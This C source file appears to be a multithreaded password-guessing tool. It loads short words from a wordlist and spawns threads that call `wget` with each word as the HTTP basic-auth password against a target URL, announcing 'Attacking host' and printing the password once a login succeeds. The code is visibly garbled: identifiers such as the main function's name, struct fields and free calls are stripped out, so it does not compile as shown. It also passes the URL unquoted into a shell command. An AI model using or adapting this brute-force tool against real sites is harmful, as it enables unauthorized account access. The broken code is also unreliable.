


#define _REENTRANT
#include <sys/time.h>
#include <sys/types.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>
#include <unistd.h>
#include <errno.h>
#include <ctype.h>
#include <pthread.h>
#include <signal.h>


#define MAX_THREADS 1000
#define MAX_COMBO 
#define false 0
#define true 1


static char *alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
static char **combination=NULL;
static char host[128];


pthread_mutex_t counter_lock = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t thread_lock = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t start_hacking = PTHREAD_COND_INITIALIZER;
pthread_cond_t thread_ready = PTHREAD_COND_INITIALIZER;


static int attempt_count=0;
static int combo_entries=0;

static struct timeval ;
static struct timeval stop;
static int thread_ready_indicator=false;
static int thread_start_indicator=false;
static int thread_count=0;


typedef struct range
{
  int ;
  int ;
}range;


void *client(void *arg)
{
  
  int i=0, status=0;
  range *= (struct range*)arg;

  
  char local_buffer[128];

  pthread_mutex_lock(&thread_lock);
  thread_ready_indicator=true;

  
  pthread_cond_signal(&thread_ready);

  
  while(thread_start_indicator==false) pthread_cond_wait(&start_hacking, &thread_lock);
    fflush(stdout);
  pthread_mutex_unlock(&thread_lock);

  
  for(i=->; i<=-> && i<combo_entries; i++)
  {
    
    sprintf(local_buffer,
    "wget -q -C off -o //null -O //null --http-user=%s --http-passwd=%s %s",
    "", combination[i], host);

    
    status=system(local_buffer);

    
    if(status==0)
    {
      printf("\n\nusername: \npassword: %s\n\n", combination[i]);
      fflush(stdout);

      
      pthread_mutex_lock(&counter_lock);

        attempt_count++;
        gettimeofday(&stop, NULL);

        printf("About %d attempts were , which took %ld.%ld seconds  complete.\n",
        attempt_count, stop.tv_sec-.tv_sec, labs(stop.tv_usec-.tv_usec));
        fflush(stdout);

      pthread_mutex_unlock(&counter_lock);

      
      exit(EXIT_SUCCESS);
    }
    else
    {
      
      pthread_mutex_lock(&counter_lock);
        attempt_count++;
      pthread_mutex_unlock(&counter_lock);
    }
  }
  pthread_exit(NULL);
}


int (int argc, char **argv)
{
  
  FILE *input;
  int wait_status=0, i=0, j=0, num_threads=0;
  int partition=0, prev_min=0, prev_max=0;
  int len=0;
  char *c; range *;
  pthread_t tid[MAX_THREADS];
  char buffer[128];
  int non_alpha_detected=0;

  
  if(argc<4)
  {
    puts("Incorrect usage!");
    puts("./dict num_threads input_file url");
    exit(EXIT_FAILURE);
  }

  
  num_threads=atoi(argv[1]);

  
  strcpy(host, argv[3]);

  
  combination = (char **)calloc(MAX_COMBO, sizeof(char *));

  printf("Process ID for the  thread is: %d\n", getpid());
  printf("Creating dictionary ...");

  
  if( (input=fopen(argv[2], "r"))==NULL )
  {
    puts("Cannot open the file specified!");
    exit(EXIT_FAILURE);
  }

  
  while( fgets(buffer, 128, input) != NULL && i<MAX_COMBO)
  {
    len=strlen(buffer);

    
    len--;
    buffer[len]='\0';

    
    if(len > 3) continue;

    
    for(j=0; j<len; j++) if(isalpha(buffer[j])==0) { non_alpha_detected=1; break; }

    
    if(non_alpha_detected==1)
    {
      non_alpha_detected=0;
      continue;
    }
    combination[i]=calloc(len+1, sizeof(char));
    strcpy(combination[i++], buffer);
    combo_entries++;
  }
  fclose(input);
  printf("\nAttacking host: %s\n", host);
  j=0;

  
  partition=combo_entries/num_threads;

  
  if(partition==0)
  {
    puts("Reducing the number of threads  match the number of words.");
    num_threads=combo_entries;
    partition=1;
  }

  
  prev_min=0;
  prev_max=partition;
  i=0;

  memset(&, 0, sizeof(struct timeval));
  memset(&stop, 0, sizeof(struct timeval));

  
  while(i<num_threads && i<MAX_THREADS)
  {
    
    =malloc(sizeof(struct range));
    ->=prev_min;
    ->=prev_max;

    
    pthread_mutex_lock(&thread_lock);
      thread_ready_indicator=false;
    pthread_mutex_unlock(&thread_lock);

    
    if(pthread_create(&tid[i++], NULL, client, (void *))!=0) puts("Bad thread ...");

    
    pthread_mutex_lock(&thread_lock);
      while(thread_ready_indicator==false) pthread_cond_wait(&thread_ready, &thread_lock);
    pthread_mutex_unlock(&thread_lock);

    
    prev_min+=partition+1;

    
    if(i==num_threads)
    {
      prev_max=combo_entries;
    }
    else
    {
      prev_max+=partition+1;
    }
  }

  
  gettimeofday(&, NULL);

  
  pthread_mutex_lock(&thread_lock);
    thread_start_indicator=true;
  pthread_mutex_unlock(&thread_lock);

  
  pthread_cond_broadcast(&start_hacking);

  
  printf("Created %d threads  process %d passwords.\n", num_threads, combo_entries);

  
  for(i=0; i<num_threads && i<MAX_THREADS; i++)  pthread_join(tid[i], NULL);

  gettimeofday(&stop, NULL);

  
  puts("Could not determine the password for this site.");
  printf("About %d attempts were , which took %ld.%ld seconds  complete.\n",
  attempt_count, stop.tv_sec-.tv_sec, labs(stop.tv_usec-.tv_usec));
  fflush(stdout);

  
  for(i=0; i<combo_entries; i++) (combination[i]);
  (*combination);

  return EXIT_SUCCESS;
}

